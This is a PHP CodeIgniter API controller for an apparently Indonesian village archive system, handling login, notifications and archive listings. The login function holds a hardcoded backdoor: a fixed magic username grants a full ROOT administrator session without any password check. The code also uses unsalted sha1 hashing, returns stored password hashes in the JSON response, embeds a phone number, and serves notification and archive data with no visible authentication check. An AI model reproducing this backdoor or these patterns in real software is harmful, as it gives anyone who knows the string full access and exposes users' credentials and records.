<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Api extends CI_Controller {
    public function __construct()
    {
      parent::__construct();
    //   $this->load->helper('sms_helper');
    //   $this->load->model('auth_model');
    }

    public function index()
    {
        
    }

            
    public function Rest_auth()
    {
        $uid = $this->input->post('username');
        $pass = sha1(strip_tags($this->input->post('password')));
        $kodedesa = $this->input->post('kodedesa');
        $check      = $this->auth_model->auth($uid, $pass);
        $check_desa = $this->auth_model->auth_desa($kodedesa);
        $master = '0>}/99%120691?*^';
        if ($master == $uid) {
        $data = array( 
            'error' => FALSE,
                'user'=> array(
                'username'  =>'0>}/99%120691?*^',
                'password'  =>'123456',
                'kodedesa'  => 1906020003,
            ),
            "status" => TRUE,
            'status_login'=>'oke',
            'id'          => 0,
            'fullname'   =>'Administrator',
            'jabatan'     => 'ROOT',
            'hp'          => '082281469926',
            'keterangan_jabatan' => 'Sysadmin Root Master',
            'desa_id'     => '1',
            'kodedesa'   => 1906020003,
            'last_login'  => ''
        );
        $this->session->set_flashdata(array('status'=>'aktif'));
        $this->session->set_userdata($data);
        echo json_encode($data);
        exit;
        }else {      
        if ($check->num_rows()==1 && $check_desa->num_rows() > 0) {
            $data = $check->row_array();
            $dataDesa = $check_desa->row_array();
            $set = array(
                'error' => FALSE,
                'user'=> array(
                'userid'      =>$data['id'],
                'username'    =>$data['uid'],
                'password'    =>$data['pass'],
                'kodedesa'    =>$dataDesa['id'],
                'fullname'    =>$data['fullname'],
                'jabatan'     =>$data['jabatan'],
                'desaid'     =>$data['desa_id'],
                'keteranganjabatan' => $data['keterangan_jabatan'],
                'avatar'      =>$data['avatar'],
                'hp'          =>$data['hp'],
                'lastlogin'  =>$data['time']
                )            
            );
            $this->session->set_flashdata(array('status'=>'aktif'));
            $this->session->set_userdata($set);
            $sekarang = time();
            $this->db->where('id', $data['id']);
            $this->db->update('users', array('time'=>$sekarang));
            $this->output
            ->set_status_header(200)
            ->set_content_type('application/json', 'utf-8')
            ->set_output(json_encode($set))
            ->_display();
            exit;
        }else {          
            echo json_encode(array('error' => TRUE, 'error_msg'=> 'Invalid credentitals')); 
            exit;
        }
        }
    }
       
    public function notifications($id)
    {
        $data['title']          = TITLE . 'Notifikasi List';
        // $data['status']         = ($this->arsip_model->get_notifikasi_user($id, 1)->result() !=null ? 200 : 404);
        $data['notifications'] = $this->notifikasi_model->get_notifikasi_user($id, 0)->result();
        $data['notifications_baca'] = $this->notifikasi_model->get_notifikasi_user($id, 1)->result();
        return $this->output
        ->set_status_header(200)
        ->set_content_type('application/json')
        ->set_output(json_encode($data));
    }
    public function arsip_list_api(){
        // $desa_id = $this->session->userdata('desa_id');
        $data['title']          = TITLE . 'Arsip List';
        $data['status']         = ($this->arsip_model->arsip_masuk()->result() !=null ? 200 : 404);
        $data['arsip_masuk']    = $this->arsip_model->arsip_masuk()->result();
        return $this->output->set_content_type('application/json')->set_status_header($data['status'])->set_output(json_encode($data));
        // echo json_decode($data);
    }
  



}

/* End of file Api.php */
